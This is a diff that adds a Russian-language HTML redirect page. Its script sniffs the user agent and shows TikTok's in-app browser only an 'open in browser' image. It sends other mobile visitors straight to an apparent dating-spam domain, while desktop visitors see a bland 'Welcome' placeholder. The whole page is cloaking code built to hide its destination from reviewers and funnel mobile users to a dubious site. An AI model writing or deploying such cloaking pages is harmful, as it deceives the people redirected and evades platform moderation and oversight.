@@ -1,1 +1,76 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Переход...</title>
+
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      background: #000;
+      color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      font-family: sans-serif;
+      text-align: center;
+      overflow: hidden;
+    }
+
+    img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+    }
+
+    .pc img {
+      max-width: 90%;
+      height: auto;
+      object-fit: contain;
+    }
+
+    .pc p {
+      max-width: 90%;
+    }
+  </style>
+</head>
+<body>
+  <div id="content"></div>
+
+  <script>
+    const ua = navigator.userAgent.toLowerCase();
+    const targetUrl = "https://ywwphrr.daily-romancedatings.com/rb6223a";
+
+    function isTikTokBrowser() {
+      return ua.includes("tiktok") || ua.includes("musical");
+    }
+
+    function isMobile() {
+      return /android|iphone|ipad|ipod|windows phone/i.test(ua);
+    }
+
+    if (isTikTokBrowser()) {
+      // TikTok — только картинка
+      document.getElementById("content").innerHTML = `
+        <img src="open_browser2.jpg" alt="Open in browser">
+      `;
+    } else if (isMobile()) {
+      // Обычный мобильный браузер — редирект
+      window.location.href = targetUrl;
+    } else {
+      // ПК — заглушка
+      document.getElementById("content").innerHTML = `
+        <div class="pc">
+          <img src="pc_placeholder.jpg" alt="Welcome">
+          <p>Добро пожаловать!</p>
+        </div>
+      `;
+    }
+  </script>
+</body>
+</html>
 
